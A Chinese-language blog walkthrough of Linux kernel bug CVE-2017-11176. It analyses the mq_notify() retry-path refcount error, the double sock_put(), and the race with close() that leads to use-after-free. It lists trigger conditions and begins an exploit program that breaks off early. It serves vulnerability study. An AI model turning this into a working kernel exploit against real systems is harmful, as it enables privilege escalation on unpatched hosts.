<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mqueue: fix a use-after-free in sys_mq_notify()</span><br><span class="line">The retry logic for netlink_attachskb() inside sys_mq_notify()</span><br><span class="line">is nasty and vulnerable:</span><br><span class="line"></span><br><span class="line">1) The sock refcnt is already released when retry is needed</span><br><span class="line">2) The fd is controllable by user-space because we already</span><br><span class="line">   release the file refcnt</span><br><span class="line"></span><br><span class="line">so we then retry but the fd has been just closed by user-space</span><br><span class="line">during this small window, we end up calling netlink_detachskb()</span><br><span class="line">on the error path which releases the sock again, later when</span><br><span class="line">the user-space closes this socket a use-after-free could be</span><br><span class="line">triggered.</span><br><span class="line"></span><br><span class="line">Setting &apos;sock&apos; to NULL here should be sufficient to fix it</span><br></pre></td></tr></table></figure>
<ul>
<li>有漏洞的代码存在于<code>mq_notify</code></li>
<li>在<code>retry</code>的逻辑中有错误</li>
<li>在<code>sock</code>的计数器上有错误导致UAF</li>
<li>漏洞与已经关闭的<code>fd</code>的条件竞争有关</li>
</ul>
<h3 id="0x03-Understanding-the-Bug"><a href="#0x03-Understanding-the-Bug" class="headerlink" title="0x03 Understanding the Bug"></a>0x03 Understanding the Bug</h3><h4 id="问题代码"><a href="#问题代码" class="headerlink" title="问题代码"></a>问题代码</h4><p>重点关注<code>retry</code>的逻辑和函数退出的路径：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">      <span class="comment">// from [ipc/mqueue.c]</span></span><br><span class="line"></span><br><span class="line">      SYSCALL_DEFINE2(mq_notify, <span class="keyword">mqd_t</span>, mqdes,</span><br><span class="line">          <span class="keyword">const</span> struct sigevent __user *, u_notification)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">notification</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">nc</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... cut (copy userland data to kernel + skb allocation) ...</span></span><br><span class="line"></span><br><span class="line">        sock = <span class="literal">NULL</span>;</span><br><span class="line">    retry:</span><br><span class="line">[<span class="number">0</span>]       filp = fget(notification.sigev_signo);</span><br><span class="line">          <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">            ret = -EBADF;</span><br><span class="line">[<span class="number">1</span>]         <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">2</span>a]      sock = netlink_getsockbyfilp(filp);</span><br><span class="line">[<span class="number">2b</span>]      fput(filp);</span><br><span class="line">          <span class="keyword">if</span> (IS_ERR(sock)) &#123;</span><br><span class="line">            ret = PTR_ERR(sock);</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">3</span>]         <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          timeo = MAX_SCHEDULE_TIMEOUT;</span><br><span class="line">[<span class="number">4</span>]       ret = netlink_attachskb(sock, nc, &amp;timeo, <span class="literal">NULL</span>);</span><br><span class="line">          <span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">[<span class="number">5</span>a]        <span class="keyword">goto</span> retry;</span><br><span class="line">          <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">            sock = <span class="literal">NULL</span>;</span><br><span class="line">            nc = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">5b</span>]        <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>c]    <span class="comment">// ... cut (normal path) ...</span></span><br><span class="line"></span><br><span class="line">      out:</span><br><span class="line">        <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">          netlink_detachskb(sock, nc);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nc) &#123;</span><br><span class="line">          dev_kfree_skb(nc);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>代码开始于获取用户态提供的文件描述符[0]，如果这个<code>fd</code>不存在于当前进程的<code>fdt</code>中，将会返回空指针并进入退出流程[1]。此外，提供的文件的<code>sock</code>对象也被获取[2a]。如果没有有效的<code>sock</code>对象，同样会置NULL并进入退出流程[3]。在这两种情况下(?)，<code>file</code>结构体引用会被减一(dropped)[2b]。</p>
<p>最后，会调用<code>netlink_attachskb()</code>[4]，尝试将<code>sk_buff(nc)</code>加入到<code>sock</code>的接收队列，在这有三种可能的结果：</p>
<ol>
<li>一切正常[5c]</li>
<li>函数返回1，代码跳转到<code>retry</code>标签[5a]</li>
<li><code>nc</code>和<code>sock</code>都被设置为NULL，代码跳转到退出流程[5b]</li>
</ol>
<h4 id="为什么要清空sock指针"><a href="#为什么要清空sock指针" class="headerlink" title="为什么要清空sock指针"></a>为什么要清空sock指针</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">out:</span><br><span class="line">  <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">    netlink_detachskb(sock, nc);  <span class="comment">// &lt;----- here</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">netlink_detachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  kfree_skb(skb);</span><br><span class="line">  sock_put(sk);       <span class="comment">// &lt;----- here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ungrab socket and destroy it if it was the last reference. */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_put</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_dec_and_test(&amp;sk-&gt;sk_refcnt))    <span class="comment">// &lt;----- here</span></span><br><span class="line">    sk_free(sk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>sock</code>被置NULL并进入退出流程，它的引用计数器<code>sk_refcnt</code>无条件地会被减1。如patch所描述的，漏洞代码的<code>sock</code>对象的<code>refcount</code>存在着问题，但<code>refcount</code>是在何处被加1的？查看<code>netlink_getsockbyfilp()</code>[2a]：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function">struct sock *<span class="title">netlink_getsockbyfilp</span><span class="params">(struct file *filp)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> = <span class="title">filp</span>-&gt;<span class="title">f_path</span>.<span class="title">dentry</span>-&gt;<span class="title">d_inode</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!S_ISSOCK(inode-&gt;i_mode))</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOTSOCK);</span><br><span class="line"></span><br><span class="line">      sock = SOCKET_I(inode)-&gt;sk;</span><br><span class="line">      <span class="keyword">if</span> (sock-&gt;sk_family != AF_NETLINK)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   sock_hold(sock);    <span class="comment">// &lt;----- here</span></span><br><span class="line">      <span class="keyword">return</span> sock;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from [include/net/sock.h]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">sock_hold</span><span class="params">(struct sock *sk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  atomic_inc(&amp;sk-&gt;sk_refcnt);   <span class="comment">// &lt;------ here</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sock</code>对象的<code>refcounter</code>在[0]处被增加，计数器无条件地被<code>netlink_getsockbyfilp()</code>加一，被<code>netlink_detachskb()</code>（如果<code>sock</code>非空）减一，这意味着<code>netlink_attachskb()</code>应该以某种形式对<code>refcounter</code>保持中立。（attach的调用位于另外两个函数中间）</p>
<p>简化版的<code>netlink_attachskb()</code>代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attach a skb to a netlink socket.</span></span><br><span class="line"><span class="comment"> * The caller must hold a reference to the destination socket. On error, the</span></span><br><span class="line"><span class="comment"> * reference is dropped. The skb is not sent to the destination, just all</span></span><br><span class="line"><span class="comment"> * all error checks are performed and memory in the queue is reserved.</span></span><br><span class="line"><span class="comment"> * Return values:</span></span><br><span class="line"><span class="comment"> * &lt; 0: error. skb freed, reference to sock dropped.</span></span><br><span class="line"><span class="comment"> * 0: continue</span></span><br><span class="line"><span class="comment"> * 1: repeat lookup - reference dropped while waiting for socket memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">          <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">  nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut (wait until some conditions) ...</span></span><br><span class="line"></span><br><span class="line">    sock_put(sk);         <span class="comment">// &lt;----- refcnt decremented here</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">      kfree_skb(skb);</span><br><span class="line">      <span class="keyword">return</span> sock_intr_errno(*timeo); <span class="comment">// &lt;----- "error" path</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;   <span class="comment">// &lt;----- "retry" path</span></span><br><span class="line">  &#125;</span><br><span class="line">  skb_set_owner_r(skb, sk);   <span class="comment">// &lt;----- "normal" path</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>netlink_attachskb()</code>有两条路径：</p>
<ol>
<li>正常路径：<code>skb</code>拥有权转到<code>sock</code>（例如加入到sock的接收队列中）</li>
<li>Socket的接收缓冲区已满：等待直到有足够的空间并重试，或退出</li>
</ol>
<p>如注释所言：调用者必须持有对目标套接字的引用(?)。 出错时，<code>refcounter</code>会被减1，因此<code>netlink_attachskb</code>对<code>sock</code>的<code>refcounter</code>有副作用。</p>
<p>既然<code>netlink_attachskb</code>可能释放<code>refcounter</code>，调用者应该确保它不能被释放第二次，这个由将<code>sock</code>设置为NULL实现。在错误路径中<code>sock</code>被正确处理了，但在<code>retry</code>中并没有。</p>
<p>至此，我们知道了错误发生的情况，即<code>retry</code>逻辑中没有正确重置<code>sock</code>为NULL。</p>
<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>Patch中提到了与已经关闭的<code>fd</code>相关的条件竞争窗口，首先来看下<code>retry</code>逻辑的起始位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sock = <span class="literal">NULL</span>;  <span class="comment">// &lt;----- first loop only</span></span><br><span class="line">retry:</span><br><span class="line">      filp = fget(notification.sigev_signo);</span><br><span class="line">      <span class="keyword">if</span> (!filp) &#123;</span><br><span class="line">        ret = -EBADF;</span><br><span class="line">        <span class="keyword">goto</span> out;         <span class="comment">// &lt;----- what about this?</span></span><br><span class="line">      &#125;</span><br><span class="line">      sock = netlink_getsockbyfilp(filp);</span><br></pre></td></tr></table></figure>
<p>在第一次循环的时候，错误处理路径看起来似乎是无害的，但是要记住，在第二次循环的时候（goto retry之后），<code>sock</code>已经不是NULL了，并且<code>refcounter</code>已经被减1。所以，直接跳到<code>out</code>，满足了第一个条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">out:</span><br><span class="line">  <span class="keyword">if</span> (sock) &#123;</span><br><span class="line">    netlink_detachskb(sock, nc);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>sock</code>在这被减1了第二次（<strong>double sock_put() bug</strong>）。可能会疑惑为什么会在第二次循环中触发这个条件（<code>fgets</code>返回NULL），这就是这个漏洞的条件竞争部分，会在下一章说明。</p>
<h4 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h4><p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true" alt="流程图"></p>
<p><code>close</code>系统调用触发<code>fputs()</code>（对<code>refcounter</code>减1）并从映射表中将fd和文件的映射移除，将<code>fdt[TARGET_FD]</code>的入口设置为NULL。因为调用<code>close(fd)</code>函数将会释放最后一个对文件的引用，所以<code>file</code>结构体将会被释放。由于<code>file</code>结构体被释放，相关联的<code>sock</code>的结构体的引用计数被减1，且<code>sock</code>的计数为0，导致它被释放。这时，<code>sock</code>指针并没有被设置为NULL，使其成为了一个野指针。</p>
<p>因为fd已经不指向任何有效的文件结构了，所以第二次调用<code>fget()</code>时会失败，程序将会跳转到<code>out</code>标签处。接着<code>netlink_detachskb()</code>将会使用之前已经被释放的<code>sock</code>指针，导致<em>use after free</em>。这里的<em>use after free</em>是漏洞导致的结果而不是漏洞产生的原因。</p>
<p>这就是为什么patch提到了关闭fd，这是触发漏洞的必要条件。并且因为<code>close()</code>发生在其它线程中的特定时间，所以产生了竞争条件。</p>
<p>到此为止，我们知道了关于漏洞的所有知识以及如何触发它，需要明确两个条件：</p>
<ol>
<li>在第一个<code>retry</code>中，<code>netlink_attachskb()</code>应该返回1</li>
<li>在第二个<code>retry</code>中，<code>fget()</code>应该返回NULL</li>
</ol>
<p>换句话说，当我们从<code>mq_notify()</code>系统调用返回时，<code>sock</code>的<code>refcounter</code>已经被减去了1，这里出现了失衡。因为<code>refcounter</code>在进入系统调用之前是1，当它释放后，在<code>netlink_detachskb()</code>中又被使用。</p>
<h3 id="0x04-如何到达retry逻辑"><a href="#0x04-如何到达retry逻辑" class="headerlink" title="0x04  如何到达retry逻辑"></a>0x04  如何到达retry逻辑</h3><p>在之前的章节中，我们分析了漏洞及其触发的条件，在这个章节，我们将会探究如何到达漏洞代码处并编写exp。事实上，确认bug是否能被利用是第一要务，如果无法到达相应的代码处，也就没有继续研究的必要了。</p>
<h4 id="分析retry之前的代码"><a href="#分析retry之前的代码" class="headerlink" title="分析retry之前的代码"></a>分析retry之前的代码</h4><p>如同大多数系统调用一样，<code>mq_notift</code>一开始也调用<code>copy_from_user()</code>函数从用户态读取数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    SYSCALL_DEFINE2(mq_notify, <span class="keyword">mqd_t</span>, mqdes,</span><br><span class="line">        <span class="keyword">const</span> struct sigevent __user *, u_notification)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> ret;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sock</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">notification</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">mqueue_inode_info</span> *<span class="title">info</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">nc</span>;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (u_notification) &#123;</span><br><span class="line">[<span class="number">1</span>]     <span class="keyword">if</span> (copy_from_user(&amp;notification, u_notification,</span><br><span class="line">              <span class="keyword">sizeof</span>(struct sigevent)))</span><br><span class="line">          <span class="keyword">return</span> -EFAULT;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      audit_mq_notify(mqdes, u_notification ? &amp;notification : <span class="literal">NULL</span>);  <span class="comment">// &lt;--- you can ignore this</span></span><br></pre></td></tr></table></figure>
<p>代码在[0]处检查<code>u_notification</code>是否被设置为NULL，在[1]处从用户态拷贝数据到<code>notification</code>。接下来，可以看到一系列基于用户态数据中的sigevent结构体的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">      nc = <span class="literal">NULL</span>;</span><br><span class="line">      sock = <span class="literal">NULL</span>;</span><br><span class="line">[<span class="number">2</span>]   <span class="keyword">if</span> (u_notification != <span class="literal">NULL</span>) &#123;</span><br><span class="line">[<span class="number">3</span>a]     <span class="keyword">if</span> (unlikely(notification.sigev_notify != SIGEV_NONE &amp;&amp;</span><br><span class="line">               notification.sigev_notify != SIGEV_SIGNAL &amp;&amp;</span><br><span class="line">               notification.sigev_notify != SIGEV_THREAD))</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">[<span class="number">3b</span>]    <span class="keyword">if</span> (notification.sigev_notify == SIGEV_SIGNAL &amp;&amp;</span><br><span class="line">          !valid_signal(notification.sigev_signo)) &#123;</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">[<span class="number">3</span>c]    <span class="keyword">if</span> (notification.sigev_notify == SIGEV_THREAD) &#123;</span><br><span class="line">          <span class="keyword">long</span> timeo;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* create the notify skb */</span></span><br><span class="line">          nc = alloc_skb(NOTIFY_COOKIE_LEN, GFP_KERNEL);</span><br><span class="line">          <span class="keyword">if</span> (!nc) &#123;</span><br><span class="line">            ret = -ENOMEM;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line">[<span class="number">4</span>]       <span class="keyword">if</span> (copy_from_user(nc-&gt;data,</span><br><span class="line">              notification.sigev_value.sival_ptr,</span><br><span class="line">              NOTIFY_COOKIE_LEN)) &#123;</span><br><span class="line">            ret = -EFAULT;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* <span class="doctag">TODO:</span> add a header? */</span></span><br><span class="line">          skb_put(nc, NOTIFY_COOKIE_LEN);</span><br><span class="line">          <span class="comment">/* and attach it to the socket */</span></span><br><span class="line"></span><br><span class="line">    retry:                                    <span class="comment">// &lt;---- we want to reach this!</span></span><br><span class="line">            filp = fget(notification.sigev_signo);</span><br></pre></td></tr></table></figure>
<p>如果[2]处非NULL，<code>sigev_notify</code>的值会在[3a] [3b] [3c]检查三遍。另一次<code>copy_from_user()</code>在[4]处根据<code>notification.sigev_value_sival_ptr</code>的值触发，需要指向一个用户空间中有效的、可读取的区域的指针，否则函数调用会失败。</p>
<p><code>sigevent</code>声明如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [include/asm-generic/siginfo.h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> sigval &#123;</span><br><span class="line">  <span class="keyword">int</span> sival_int;</span><br><span class="line">  <span class="keyword">void</span> __user *sival_ptr;</span><br><span class="line">&#125; <span class="keyword">sigval_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> &#123;</span></span><br><span class="line">  <span class="keyword">sigval_t</span> sigev_value;</span><br><span class="line">  <span class="keyword">int</span> sigev_signo;</span><br><span class="line">  <span class="keyword">int</span> sigev_notify;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="keyword">int</span> _pad[SIGEV_PAD_SIZE];</span><br><span class="line">     <span class="keyword">int</span> _tid;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="keyword">void</span> (*_function)(<span class="keyword">sigval_t</span>);</span><br><span class="line">      <span class="keyword">void</span> *_attribute; <span class="comment">/* really pthread_attr_t */</span></span><br><span class="line">    &#125; _sigev_thread;</span><br><span class="line">  &#125; _sigev_un;</span><br><span class="line">&#125; <span class="keyword">sigevent_t</span>;</span><br></pre></td></tr></table></figure>
<p>为了进入<code>retry</code>至少一次，我们需要：</p>
<ol>
<li>提供一个非空的<code>u_notification</code>参数</li>
<li>讲<code>u_notification.sigev_notify</code>设置为<code>SIGEV_THREAD</code></li>
<li><code>notification.sigev_value.sival_ptr</code>必须是一个合法的用户空间可读指针，数据长度至少32字节(NOTIFY_COOKIE_LEN=32)。</li>
</ol>
<h4 id="开始编写exploitation"><a href="#开始编写exploitation" class="headerlink" title="开始编写exploitation"></a>开始编写exploitation</h4><p>先编写一个exp验证<code>mq_notify</code>可用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * CVE-2017-11176 Exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mqueue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTIFY_COOKIE_LEN (32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"-=&#123; CVE-2017-11176 Exploit &#125;=-\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the sigevent 